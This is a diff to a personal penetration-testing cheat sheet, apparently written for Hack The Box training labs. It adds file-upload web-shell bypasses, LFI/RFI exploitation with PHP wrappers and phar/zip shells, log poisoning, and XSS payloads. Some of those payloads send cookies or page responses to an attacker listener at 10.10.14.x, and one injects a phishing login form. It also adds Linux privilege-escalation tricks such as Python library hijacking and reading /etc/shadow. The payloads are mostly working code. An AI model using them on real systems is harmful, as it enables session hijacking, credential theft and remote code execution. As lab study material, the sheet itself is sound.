@@ -2405,14 +2405,21 @@ Parameters are very important to spot, and they are grouped in different categor
 #### FFUF
 
 ```bash
+GENERAL:
+	-X POST -d 'PARAM1=value1&PARAM2=value2'	# POST
+	-request req.txt --request-proto http		# From txt
+
 FILTER OPTIONS:
-  -fc              # HTTP status codes 
-  -fl              # lines in response.
-  -fr              # regexp
-  -fs              # response size. 
-  -fw              # amount of words in response.
-POST REQUESTS
-  -X POST -d 'PARAM1=value1&PARAM2=value2'		#same as curl
+	-fc              # HTTP status codes 
+    -fl              # lines in response.
+    -fr              # regexp (responde do not contain the words)
+    -mr			     # regexp (responde contains the words)
+    -fs              # response size. 
+    -fw              # amount of words in response.
+  
+OUTPUT OPTIONS:
+	-c				# colored
+	-s				# Only results (silent)
 ```
 
 **REMEMBER TO COPY THE REQUEST EXACTLY!** E.g. from `Burp`
@@ -2542,6 +2549,12 @@ There are different types of POST parameters formats, depending on the *content 
 - `Content-Type: application/json` &rarr; `-d "{'PARAM':'value'}"`
 -  `Content-type: multipart/form-data`
 
+### Common Application
+
+#### Python editor
+
+https://hacktricks.boitatech.com.br/misc/basic-python/bypass-python-sandboxes
+
 #### Amazon Buckets
 
 The are different types of subdomains, for example `s3.` are amazon buckets subdomains on the cloud. Always add the subdomains to the `/ets/hosts/` file next to the domain..
@@ -2577,31 +2590,429 @@ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 
 [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files)
 
-- Web Shell
-- Configuration Files:
-  - PHP: [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration Apache .htaccess) 
-  - ASP: [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration IIS web.config) 
-  - uWSGI: [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration uwsgi.ini/uwsgi.ini) 
+##### Upload Directory
 
-#### OS File Read
+- Fuzz
+- Use other vulnerabilities to find the upload files by reading the web application code (e.g. php filters)
+- Force error messages
+  - Upload a file with a name that already exists
+  - Send two identical requests simultaneously
+  - Upload a file with a very long name (e.g., 5,000 characters)
+  - Windows specific:
+    - Use reserved characters in the file name, such as `|`, `<`, `>`, `*`, or `?`
+    - Usereserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`)
 
-**Directory traversal:**
+##### Allowed file Abuse
 
-```
-page=../../../../../../../../windows/system32/drivers/etc/hosts
-```
+- **Configuration Files**
 
-Linux:
+  - [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration Apache .htaccess) / [httpd.conf](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration Busybox httpd.conf)  → Apache
+
+  - [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration IIS web.config)            → ASP.NET
+
+  - [package.json](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files#configuration-files)          → NodeJS Packages
+
+  - [composer.json](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files#configuration-files)         → PHP Packages
+
+  - [__init__.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration Python __init__.py)
+
+  - [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files/Configuration uwsgi.ini/uwsgi.ini)
+
+- **SVG**
+
+  Note that sometimes SVG is not uploaded somehwere, but is rendered on the same page in real time. Use `CTRL+SHIFT+C` to see the output of the payload.
+
+  - [SVG Exploitation](https://github.com/allanlw/svg-cheatsheet) → `Content-Type: image/svg+xml`
+
+  - XXE
+
+    ```xml
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "[XXE_PAYLOAD]"> ]>
+    <svg>&xxe;</svg>
+    ```
+
+  - XSS (you need for somebody to click on the link of the image)
+
+    ```xml
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">[JS_XSS_CODE]</script>
+    </svg>
+    ```
+
+- **PNG / JPG / DJVU**
+
+  - [ImageMagick 7.0.1-1](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files) / [7.1.0-49 beta](https://github.com/kljunowsky/CVE-2022-44268)
+
+  - [PNG / JPG Compression Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files#picture-compression)
+
+  - Metadata Injection: 
+
+    Put a payload in a meta-tag of an image &rarr; [DJVU + EXIFTOOL RCE](https://github.com/LazyTitan33/ExifTool-DjVu-exploit)
+
+    1. For XSS change Content-type: text\html
+
+    2. Change the meta-TAG of an image:
+
+       ```bash
+       exiftool -[TAG]="[INJECTION/BACKEND/XSS]" file.png
+       ```
+
+       - The TAG can be e.g. `Comment`, `Artist`
+
+- **PDF**
+
+  - [XSS](https://medium.com/@katmaca2014/pdf-upload-leading-to-stored-xss-f712326705ee)
+
+  - Dynamic Rendering → iFrame LFI / SSRF
+
+- XML / HTML / MD / CSS
+
+  - XSS
+
+  - XXE
+
+  - SSRF
+
+  - LFI
+
+  - [Jetty XML RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files#jetty-rce)
+
+- **ZIP / TAR / GZ**
+
+  - [Exploitation](https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities#abuse-archives)
+
+  - [ZIP Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload Insecure Files#zip-archive) / RCE
+
+##### Webshell Upload
+
+Bypass Client-Side Validation → Intercept Upload Request → Webshell in Multipart Data → Bypass Type & Extension Filters 
+
+- **Front-end filter**
+
+  - Use Burp, if you don't see the Burp request:
+
+    - `CTRL+SHIFT+C` to toggle the Page Inspector
+
+    - Click on the upload form &rarr; the html code will be highlighted
+
+    - Set: 
+
+      - `method="post"`
+
+      -  `enctype="multipart/form-data"` 
+
+      - `action="/[BACKEND_FILE]"` 
+
+        Guess or fuzz the file that processes the upload
+
+  - Disable front-end validation
+    - `CTRL+SHIFT+C` to toggle the Page Inspector
+    - Click on the upload form &rarr; the html code will be highlighted
+    - `CTRL+SHIFT+K` and type functions to examine the c
+
+- **Back-end Filters**
+
+  - MIME-Type 
+
+    (internet standard that determines the type of a file through its general format and bytes structure), usually done by inspecting the first few bytes of the file.
+
+    With `ffuf` save the first MIME working file, adding a shell after the MIME
+
+    ```bash
+    ffuf -request req.txt --request-proto http -w /usr/share/wordlists/file_upload/mime-bytes.txt -s | head -n 1 > allowed_mime
+    ```
+
+  - Content-type: usually you can keep the Content-type of an allowed file
+
+    ```bash
+    ffuf -request req.txt --request-proto http -w /usr/share/wordlists/file_upload/content-types.txt:FUZZTYPE -w allowed_mime:FUZZMIME
+    ```
+
+  - Try MIME and Content-type indepentently first, if not with both FUZZ at the same time. Then, extension is always independent:
+
+  - Extension fuzzing (replace `png` with allowed extension)
+
+    - `shell.pngFUZZEXT`
+    - `shellFUZZEXT.png`
+    - `shellFUZZEXT`
+
+    ```bash
+    ffuf -request req.txt --request-proto http -w /usr/share/wordlists/file_upload/ext_bypass.txt:FUZZEXT -w allowed_mime:FUZZMIME
+    ```
+
+  - See which shell worked:
+
+    ```bash
+    ffuf -u "http://[URL]/[UPLOADS_FOLDER]/shell.pngFUZZ?cmd=id" -w /usr/share/wordlists/file_upload/ext_bypass.txt -mr "uid" -s
+    ```
+
+##### Name Injection
+
+Inject a command in the file name (if the name of the file is reflected or processed in the back-end)
+
+- SQL / XSS / SSTI / SSRF / OS / LFI Injections 
+
+##### Windows File Convention
+
+Use the Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist:  they used a Tilde character (`~`) to complete the file name
+
+&rarr; we can write a file called (e.g. `WEB~.CONF`) to overwrite the `web.conf` file.
+
+#### LFI / RFI
+
+LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended, like when an application uses the path to a file as input. 
+
+Path wordlists:
+
+[Linux](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt): `/usr/share/wordlists/LFI/file_inclusion_linux.txt`
 
 - `/etc/passwd`, `/etc/shadow`
+
 - ssh keys
+
 - web applications credentials
+
   - where does the application save the passwords?
+
 - Opened services
 
-Windows:
+- Web root: 
+
+  `seclists/Discovery/Web-Content/default-web-root-directory-linux.txt`
+
+- [Log files](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
+
+[Windows](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt): `/usr/share/wordlists/LFI/file_inclusion_windows.txt`
 
 - `WINDOWS\System32\drivers\etc\hosts`
+
+-  `C:\Windows\boot.ini`
+
+- Web root:
+
+  `seclists/Discovery/Web-Content/default-web-root-directory-windows.txt`
+
+- [Log files]([wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows))
+
+Both:
+
+- `/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`
+
+Tools:
+
+- [LFISuite](https://github.com/D35m0nd142/LFISuite)
+- [LFiFreak](https://github.com/OsandaMalith/LFiFreak)
+-  [liffy](https://github.com/mzfr/liffy)
+
+| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
+| ---------------------------- | ---------------- | ----------- | -------------- |
+| **PHP**                      |                  |             |                |
+| `include()`/`include_once()` | ✅                | ✅           | ✅              |
+| `require()`/`require_once()` | ✅                | ✅           | ❌              |
+| `file_get_contents()`        | ✅                | ❌           | ✅              |
+| `fopen()`/`file()`           | ✅                | ❌           | ❌              |
+| **NodeJS**                   |                  |             |                |
+| `fs.readFile()`              | ✅                | ❌           | ❌              |
+| `fs.sendFile()`              | ✅                | ❌           | ❌              |
+| `res.render()`               | ✅                | ✅           | ❌              |
+| **Java**                     |                  |             |                |
+| `include`                    | ✅                | ❌           | ❌              |
+| `import`                     | ✅                | ✅           | ✅              |
+| **.NET**                     |                  |             |                |
+| `@Html.Partial()`            | ✅                | ❌           | ❌              |
+| `@Html.RemotePartial()`      | ✅                | ❌           | ✅              |
+| `Response.WriteFile()`       | ✅                | ❌           | ❌              |
+| `include`                    | ✅                | ✅           | ✅              |
+
+##### **Exploit:**
+
+- **Path Traversal**
+
+  `../../../../../etc/passwd`
+
+  - Prefix: `/`
+
+  - Suffix: 
+
+  - Bypasses: 
+
+    - `....//` `..././` `....\/` `....////`
+    - URL Encoding
+    - Fuzz approved path: `./[FUZZ]/../../../../../etc/passwd`
+    - Only some extensions are readable.
+
+  -  PHP version < 5.4
+
+     - Path truncation: Reaching the 4096 character limitation, the appended extension (`.php`) would be truncated:
+
+       ```bash
+       echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+       ```
+
+     - Null byte injection: add a null byte (`%00`) at the end
+
+- **Source Code Disclosure (PHP)**
+
+  - When a parameters allow you to execute a php file, you can use it to display the source code by using a PHP filter
+
+    ```
+    php://filter/read=convert.base64-encode/resource=[FILE_TO_READ]
+    ```
+
+- **PHP code execution**
+
+  - Check if `allow_url_include` is enabled or `expect` extension in installed
+
+    - Apache: `/etc/php/[PHP VERSION]/apache2/php.ini`
+    - Nginx: `/etc/php/[PHP VERSION]/fpm/php.ini`
+
+  - If `allow_url_include`:
+
+    - *Data* wrapper: includes code using PHP web shell encoded in base64
+
+      ```bash
+      curl -s 'http://<URL>?PARAM=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
+      ```
+
+    - *Input* wrapper: external input as POST parameter
+
+      ```bash
+      curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<URL>?[PARAM]=php://input&cmd=id"
+      ```
+
+  - If `expect` is installed:
+
+    - *Expect* wrapper: run commands in URL 
+
+      ```bash
+      curl -s "http://<URL>/?[PARAM]=expect://id"
+      ```
+
+  - If `zip wrapper` is enabled and **images** can be uploaded:
+
+    1. Create and zip a web shell
+
+       ```bash
+       echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+       ```
+
+    2. Upload `shell.jpg`
+
+    3. Include it using the zip wrapper (check upload location)
+
+       ```
+       zip://[PATH]/shell.jpg%23shell.php&cmd=id
+       ```
+
+       `%23` is `#` in URL encoding
+
+  - if `phar` is enabled and **images** can be uploaded:
+
+    1. Create a shell.php file
+
+       ```php
+       <?php
+       $phar = new Phar('shell.phar');
+       $phar->startBuffering();
+       $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+       $phar->setStub('<?php __HALT_COMPILER(); ?>');
+       
+       $phar->stopBuffering();
+       ```
+
+    2. Compile it in a phar file
+
+       ```bash
+       php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+       ```
+
+    3. Upload shell.jpg (check upload location)
+
+    4. Include it with phar wrapper
+
+       ```
+       phar://[PATH]/shell.jpg%2Fshell.txt&cmd=id
+       ```
+
+- **RFI**:
+
+  To verify, try to include a URL (first a local one, but not the vulnerable page itself, since it could cause a loop), and see if we can get its content.
+
+  `allow_url_include` has to be enabled, apart from SMB.
+
+  1. Write a script in the language of the web application
+
+  2. Host and include the script
+
+     - http:
+
+       ```bash
+       sudo python3 -m http.server <LISTENING_PORT>	# 80 or 443
+       ```
+
+     - ftp:
+
+       ```bash
+       sudo python -m pyftpdlib -p 21
+       ```
+
+     - smb - doesn't require `allow_url_include`:
+
+       ```
+       smbserv
+       ```
+
+- **Log poisoning:**
+
+  Requires execute privileges.
+
+  Writing PHP code in a field gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.
+
+  - PHP:
+
+    `PHPSESSID` cookies, can hold specific user-related data on the back-end (`/var/lib/php/sessions/` on Linux and `C:\Windows\Temp\` on Windows).  if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its name would be `sess_el4ukv0kqbvoirg7nkp4dncpk3`
+
+    1. Check if `PHPSESSID` cookie is set
+
+    2. Try to include the `sess_*` file in the vulnerable parameter
+
+    3. Check the `sess_*` file,  do you have control over a specified parameter? If so, try to change it to a string by sending another request, and check again if it changed
+
+    4. Poisoning by writing PHP code into the session file
+
+       ```bash
+       http://<SERVER_IP>:<PORT>/index.php?[PARAM]=[SHELL]
+       ```
+
+       Don't use a non-permanent web shell, because with each command you would overwrite the `sess_*` file.
+
+    5. Include the `sess_*` file by LFI
+
+  - Apache & Nginx
+
+    1. Look for `access.log` and `error.log` or others and try to read them
+
+       - Apache: `/var/log/apache2/` `C:\xampp\apache\logs\`
+
+       - Nginx: `/var/log/nginx/` `C:\nginx\log\`
+       - Others for Linux: 
+         - `/proc/self/environ`
+         -  `/proc/self/fd/N` files (N is a PID usually between 0-50)
+         - `/var/log/sshd.log`
+         - `/var/log/mail`
+         - `/var/log/vsftpd.log`
+
+    2. Look for parameters (also the header) that you can control &rarr; poison
+
+    3. Web shell in the parameter
+
+  - Open Services
+
+    If the `ssh`, `mail` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into  them and set the username to PHP code, and upon including their logs,  the PHP code would execute.
 
 #### SQL Injections
 
@@ -2826,21 +3237,6 @@ ffuf -u [URL] param=[WorkingParam][Payload] -w /usr/share/wordlists/sql_prefix.t
     
     Use `FROM_BASE64("base64_data")` to write long files
 
-#### LFI / RFI
-
-LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application, like when an application uses the path to a file as input. 
-
-We test the page parameter to see if we can include files on the target system in the server response, with common paths:
-
--  [Windows](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)
-- [Linux](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt)
-
-Functions vulnerable to LFI:
-
-- php: `include()`
-
-For a **RFI** you load the file remotely, e.g. though a server.
-
 #### XXE Injection
 
 *XML* is a markup language  and file format for storing, transmitting, and reconstructing arbitrary data. 
@@ -2919,19 +3315,120 @@ To exploit it, one can change the POST data of the web request in an empty array
 
 #### XSS 
 
-- **Generalities:** 
+##### Generalities:
 
-  Cross-site scripting (also known as XSS) normally allow an  attacker to masquerade as a victim user, to carry out any actions that  the user is able to perform, and to access any of the user's data. 
+Cross-site scripting (XSS) allow an attacker to masquerade as a victim user
+
+- **Types:**
+  - [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) input is processed by the *backend* and displayed on the page
+  - [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) (persistent or second-order XSS) input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)
+  - [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) input is processed by the *frontend* and displayed on the page
+
+- **Tools**
+
+  - BeeXssHunter
+  - `~/TOOLS/python xsstrike.py -u []`
+  - Payloads: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS Injection/README.md), [PayloadBox](https://github.com/payloadbox/xss-payload-list)
+
+##### Exploit
+
+- **Check the Payload on yourself** (a sintax check to see if it valid javascript)
+
+  ```html
+  data:text/html,<script>prompt()</script>
+  ```
 
 - **Verify:**
 
-  You can confirm most kinds of XSS vulnerability by injecting a payload  that causes your own browser to execute some arbitrary JavaScript. It's  long been common practice to use the `alert()` function for this purpose because it's short, harmless, and pretty hard to miss when it's successfully called.
+  - Check all parameters (also header!)
 
-- **Types:**
+  - Payloads Prefix: `'"></script></title></style></textarea>`
 
-  - [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) is the simplest variety of cross-site scripting. It arises when an  application receives data in an HTTP request and includes that data  within the immediate response in an unsafe way.
-  - [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) (also known as persistent or second-order XSS) arises when an  application receives data from an untrusted source and includes that  data within its later HTTP responses in an unsafe way.        
-  - [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) (also known as [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)) arises when an application contains some client-side JavaScript that  processes data from an untrusted source in an unsafe way, usually by  writing the data back to the DOM.        
+  - Reflected
+
+    - Payload with `prompt(document.domain)` function
+
+      ```html
+      <script>prompt(document.domain)</script>
+      <script/src="data:;base64,cHJvbXB0KGRvY3VtZW50LmRvbWFpbikK"></script>
+      <svg/onload=eval(atob("cHJvbXB0KGRvY3VtZW50LmRvbWFpbikK"));>
+      ```
+
+  - Blind
+
+    - Take the reflected payloads before, and replace `prompt(document.domain)` and its base64 encoded version with:
+
+      ```javascript
+      xhr=new XMLHttpRequest;xhr.open("GET","http://10.10.14.190:8888/");xhr.send();
+      ```
+
+    - Javascript payload in `evil.js` 
+
+      ```bash
+      <script src="http://10.10.14.190:8888/evil.js"></script>
+      ```
+
+  - Other payloads: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS Injection/README.md)
+
+- **Login form Injection**
+
+  1. Open a server
+
+  2. Write a malicios login form using  `document.write('[CODE HERE]')`
+
+     ```html
+     <h3>Please login to continue</h3><form action=http://10.10.14.141:8888><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>
+     ```
+
+- **Cookie stealing**
+
+  Steals cookies to hijack a logged-in session (If they have `HttpOnly: False`)
+
+  ```javascript
+  new Image().src="http://10.10.14.3:8888/?c="+btoa(document.cookie);
+  ```
+
+  ```javascript
+  xhr=new XMLHttpRequest;xhr.open("GET","http://10.10.14.3:8888/?c="+btoa(document.cookie));xhr.send();
+  ```
+
+  It will output cookies in base64 (`;` is the splitting charachters for cookies
+
+  1. Extension cookie editor
+  2. Add (bottom left)
+  3. Save & Refresh
+
+  You can now FUZZ with `-H "Cookie:""`
+
+- **Request Forgery**
+
+  Perform a request on behalf of the victim user and get the response back to to you
+
+  ```javascript
+  function b(){sr=new XMLHttpRequest;sr.open("GET","http://10.10.14.3:8888/?c"+btoa(this.responseText));sr.send();};xhr=new XMLHttpRequest;xhr.open("[METHOD]","[URL]");xhr.withCredentials=true;xhr.onload=b;xhr.send();
+  ```
+
+  In the case of POST requests
+
+  - You will need to add a Content-Type header, add this to the payload:
+
+    ```bash
+    xhr.setRequestHeader("Content-Type","[POST_DATA_TYPE]");
+    ```
+
+  - You will need to change `xhr.send()` to:
+
+    ```bash
+    xhr.send("[POST_DATA]");
+    ```
+
+  - In the case of JSON, adjust `xhr.send()` to:
+
+    ```bash
+    xhr.send(JSON.Stringify("[JSON_DATA]"));
+    ```
+
+
 
 #  Files & shells
 
@@ -4369,6 +4866,12 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
 
 ### Fundamentals
 
+**Linux smart Enumeration**
+
+```bash
+./lse.sh -l1 -e /run,/proc,/sys
+```
+
 - Terminal:
 
   - Bash command (for broken shells) `bash -c "<command>"`
@@ -4389,9 +4892,10 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
 ### Users & Privileges
 
 - `cat /etc/passwd | grep sh`
-- `cat /etc/hosts`
+
 - Last logins: `lastlog`
 - Active Users: `w`
+- Distro: `cat /etc/lsb-release`
 
 #### Groups
 
@@ -4441,7 +4945,7 @@ sudo -V		 # Check sudo version
 
 sudo su 	 # Switch to the root user 
 su [USER] 	 # Switch to a local user
-sudo -u [USER] [COMMAND] 	# Execute an application as an user
+sudo -u [USER] [COMMAND] 	# Execute an application as an user, e.g. /bin/bash
 ```
 
 **Exploits:**
@@ -4478,7 +4982,7 @@ sudo -u [USER] [COMMAND] 	# Execute an application as an user
 
 - Path Hijacking
 
-- LDD Hijacking
+- Writable dependency (libraries, ./executables...)
 
 - Wildcard abuse
 
@@ -4491,12 +4995,17 @@ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
 **Exploits:**
 
 - LDD Hijacking
+- Python library Hijacking
 
 ##### SGID binaries:
 
 ```bash
 find / -uid 0 -perm -6000 -type f 2>/dev/null
 ```
+
+**Exploits:**
+
+- Python library Hijacking
 
 ##### Capabilities
 
@@ -4546,6 +5055,36 @@ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \
   ```
 
   Libraries in this folder are given preference over other folders &rarr; Place a malicious library here
+
+- **Python Library Hijacking**
+
+  - Library with write permission:
+
+    Write the code *at the beginning* of the function that is called from the library
+
+  - Library Path
+
+    ```bash
+    # List order of library importing
+    python3 -c 'import sys; print("\n".join(sys.path))'
+    # Show installation path
+    pip3 show <module>
+    ```
+
+    - If there is a folder with write permission before the installation path of the module (higher in the list) you can create your module with, as the called function from the module, a payload.
+    - Python will first look in the same folder as the script is written in!
+
+  - PYTHONPATH edit
+
+    `PYTHONPATH` is an environment variable that indicates what directories Python can search for modules to import.
+
+    Requires also `sudo` on `python3` with `SETENV` flag
+
+    ```bash
+    sudo PYTHONPATH=/tmp/ /usr/bin/python3 [python_script]
+    ```
+
+    
 
 - [Wildcard Abuse](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html):
 
@@ -4639,10 +5178,14 @@ Directories & Files Worth Checking:
 - Service Config Files
 
   ```bash
-  find / ! -path "*/proc/*" -iname "*conf*" -type f 2>/dev/null
+  find / ! -path "*/proc/*" -iname "*conf*" -type f -readable 2>/dev/null | grep -v -E "proc|sys|run|var/lib|usr/src"
   ```
 
 #### Searching techniques
+
+- If the login supports emails &rarr; search for domain `@domain.htb`
+
+- Password is better to search file by file, only looking at config or backend files.
 
 - Search credentials in folder and subfolders:
 
@@ -4867,6 +5410,8 @@ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/nul
 - Kernel Exploits: `uname -a` 
 
 - Packages -> `dpkg -l` / `rpm -qa` -> DebSecan Tool / Privesc Tools
+
+- `polkit` vulnerability
 
 - Installed packages:
 
